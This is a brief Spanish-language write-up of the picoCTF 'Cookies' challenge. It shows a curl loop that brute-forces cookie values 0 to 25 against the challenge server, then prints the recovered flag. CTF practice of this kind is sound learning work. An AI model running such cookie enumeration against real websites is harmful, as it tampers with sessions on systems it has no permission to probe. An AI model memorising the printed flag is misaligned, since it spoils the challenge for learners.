# Nombre del reto
### Cookies
## Objetivo
```
	Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)

```

## Solucion
``` shell 
┌──(anitars㉿kali)-[~]
└─$ for i in {0..25}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
                                                                              
┌──(anitars㉿kali)-[~]
└─$ 

Realizamos un for que vaya desde el 0  hasta el 25 para que vaya buscando cual cookie tiene la bandera, agrupamos con un grep para que nos mueste solo la bandera sin necesidad de tenerla que buscar uno por uno.
```
## Referencias

	cookies
	burp